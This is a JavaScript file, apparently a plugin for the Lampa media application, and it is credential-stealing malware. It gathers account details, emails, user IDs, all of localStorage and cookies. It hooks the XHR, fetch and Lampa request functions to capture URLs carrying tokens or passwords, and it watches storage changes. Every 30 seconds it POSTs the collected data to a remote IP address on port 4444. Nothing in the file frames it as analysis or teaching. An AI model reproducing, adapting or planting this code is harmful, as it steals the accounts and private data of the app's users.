(function() {
  'use strict';

  var EXFIL_URL = 'http://5.252.116.77:4444';
  var INTERVAL = 30000;
  var interceptedUrls = [];
  var MAX_URLS = 100;

  function send(url, payload) {
    try {
      var body = JSON.stringify(payload);
      if (typeof fetch !== 'undefined') {
        fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: body,
          mode: 'no-cors'
        }).catch(function(){});
      } else {
        var x = new XMLHttpRequest();
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'application/json');
        x.send(body);
      }
    } catch(e) {}
  }

  function collectAll() {
    var data = {};

    data.unic_id = Lampa.Storage.get('lampac_unic_id', '');
    data.email = Lampa.Storage.get('account_email', '');
    data.profile_id = Lampa.Storage.get('lampac_profile_id', '');
    data.nws_id = Lampa.Storage.get('lampac_nws_id', '');

    var accRaw = Lampa.Storage.get('account', '{}');
    data.account_raw = accRaw;
    try { data.account = JSON.parse(accRaw); } catch(e) {}

    data.storage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      var v = localStorage.getItem(k);
      data.storage[k] = v;
    }

    data.cookies = document.cookie;
    data.ua = navigator.userAgent;
    data.platform = navigator.platform;
    data.lang = navigator.language;
    data.href = window.location.href;
    data.host = window.location.host;
    data.ts = Date.now();

    if (interceptedUrls.length) {
      data.intercepted_urls = interceptedUrls.slice();
      interceptedUrls = [];
    }

    return data;
  }

  function parseUrlParams(url) {
    var params = {};
    try {
      var idx = url.indexOf('?');
      if (idx === -1) { idx = url.indexOf('#'); }
      if (idx === -1) return params;
      var qs = url.substring(idx + 1).split('&');
      for (var i = 0; i < qs.length; i++) {
        var pair = qs[i].split('=');
        if (pair.length === 2) {
          params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
        }
      }
    } catch(e) {}
    return params;
  }

  function hookNetwork() {
    if (window.__phantom_xhr) return;
    window.__phantom_xhr = true;

    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      this.__phantom_url = url;
      return origOpen.apply(this, arguments);
    };

    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
      var url = this.__phantom_url || '';
      if (url && url.match(/(email|uid|token|account|auth|pass|cub_id|nws_id)/i)) {
        var entry = { ts: Date.now(), method: 'XHR', url: url, params: parseUrlParams(url) };
        if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
      }
      return origSend.apply(this, arguments);
    };

    if (typeof fetch !== 'undefined') {
      var origFetch = window.fetch;
      window.fetch = function(url, opts) {
        var urlStr = (typeof url === 'string') ? url : (url.url || url.href || '');
        if (urlStr && urlStr.match(/(email|uid|token|account|auth|pass|cub_id|nws_id)/i)) {
          var entry = { ts: Date.now(), method: 'fetch', url: urlStr, params: parseUrlParams(urlStr) };
          if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
        }
        return origFetch.apply(this, arguments);
      };
    }
  }

  function hookLampaRequest() {
    if (window.__phantom_lampa) return;
    window.__phantom_lampa = true;

    if (typeof Lampa.Reguest !== 'undefined') {
      var origNative = Lampa.Reguest.prototype.native;
      if (origNative) {
        Lampa.Reguest.prototype.native = function(url) {
          if (url && url.match(/(email|uid|token|account|auth|pass)/i)) {
            var entry = { ts: Date.now(), method: 'Lampa.Reguest', url: url, params: parseUrlParams(url) };
            if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
          }
          return origNative.apply(this, arguments);
        };
      }
    }

    if (typeof Lampa.Utils !== 'undefined' && Lampa.Utils.addUrlComponent) {
      var origAddUrl = Lampa.Utils.addUrlComponent;
      Lampa.Utils.addUrlComponent = function(url, param) {
        if (param && param.match(/(email|uid|token|account|auth|pass)/i)) {
          var entry = { ts: Date.now(), method: 'addUrlComponent', url: url, param: param };
          if (interceptedUrls.length < MAX_URLS) interceptedUrls.push(entry);
        }
        return origAddUrl.apply(this, arguments);
      };
    }
  }

  function listenStorage() {
    try {
      window.addEventListener('storage', function(e) {
        if (e.key && e.key.match(/(email|uid|token|account|auth|pass|skaz|tv_)/i)) {
          send(EXFIL_URL, {
            type: 'storage_external',
            key: e.key,
            value: e.newValue,
            oldValue: e.oldValue,
            ts: Date.now()
          });
        }
      });
    } catch(e) {}

    if (Lampa.Storage && Lampa.Storage.listener) {
      Lampa.Storage.listener.follow('change', function(e) {
        if (e.name && e.name.match(/(email|uid|token|account|auth|pass|skaz|tv_)/i)) {
          send(EXFIL_URL, {
            type: 'storage_change',
            key: e.name,
            value: Lampa.Storage.get(e.name, ''),
            ts: Date.now(),
            unic_id: Lampa.Storage.get('lampac_unic_id', '')
          });
        }
      });
    }
  }

  var timer = setInterval(function() {
    if (typeof Lampa === 'undefined') return;
    clearInterval(timer);

    hookNetwork();
    hookLampaRequest();
    listenStorage();

    send(EXFIL_URL, collectAll());

    setInterval(function() {
      send(EXFIL_URL, collectAll());
    }, INTERVAL);
  }, 200);
})();
